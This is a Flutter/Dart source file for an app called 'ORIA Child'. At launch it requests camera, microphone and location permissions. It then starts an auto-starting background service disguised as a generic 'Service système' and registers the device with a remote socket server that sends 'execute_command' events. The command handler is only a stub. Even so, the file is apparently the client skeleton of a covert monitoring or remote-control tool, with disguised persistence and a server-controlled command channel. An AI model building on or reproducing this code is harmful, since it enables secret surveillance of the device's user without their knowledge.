import 'package:flutter/material.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:socket_io_client/socket_io_client.dart' as IO;
import 'package:device_info_plus/device_info_plus.dart';
import 'dart:ui';

const String SERVER_URL = 'https://oria-server-tzc1.onrender.com';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await [Permission.camera, Permission.microphone, Permission.location, Permission.notification].request();
  await initializeService();
  runApp(const OriaChildApp());
}

Future<void> initializeService() async {
  final service = FlutterBackgroundService();
  await service.configure(
    androidConfiguration: AndroidConfiguration(
      onStart: onStart,
      autoStart: true,
      isForegroundMode: true,
      foregroundServiceNotificationId: 888,
      initialNotificationTitle: 'Service système',
      initialNotificationContent: 'Actif',
    ),
    iosConfiguration: IosConfiguration(autoStart: true, onForeground: onStart),
  );
  await service.startService();
}

@pragma('vm:entry-point')
void onStart(ServiceInstance instance) async {
  DartPluginRegistrant.ensureInitialized();
  final deviceInfo = DeviceInfoPlugin();
  final androidInfo = await deviceInfo.androidInfo;
  final deviceId = androidInfo.id;
  final deviceName = '${androidInfo.manufacturer} ${androidInfo.model}';

  // ✅ Retry automatique pour gérer le délai Render (5 min)
  IO.Socket? socket;
  void connect() {
    socket?.dispose();
    socket = IO.io(SERVER_URL, <String, dynamic>{
      'transports': ['websocket'],
      'autoConnect': true,
      'reconnection': true,
      'reconnectionDelay': 5000,
      'reconnectionAttempts': 999,
    });
    socket!.on('connect', (_) {
      print('✅ Connecté à ORIA Server');
      socket!.emit('register_child', {'deviceId': deviceId, 'deviceName': deviceName});
    });
    socket!.on('execute_command', (action) => print('📡 Commande: $action'));
    socket!.on('connect_error', (_) => print('⏳ En attente du serveur...'));
  }
  connect();
}

class OriaChildApp extends StatelessWidget {
  const OriaChildApp({super.key});
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      home: Scaffold(
        backgroundColor: Colors.black,
        body: Center(
          child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
            Icon(Icons.visibility_off, color: Colors.grey[800], size: 100),
            const SizedBox(height: 20),
            Text("ORIA Activé", style: TextStyle(color: Colors.grey[700], fontSize: 18)),
            const SizedBox(height: 10),
            Text("Service en arrière-plan actif.", style: TextStyle(color: Colors.grey[800], fontSize: 12)),
          ]),
        ),
      ),
    );
  }
}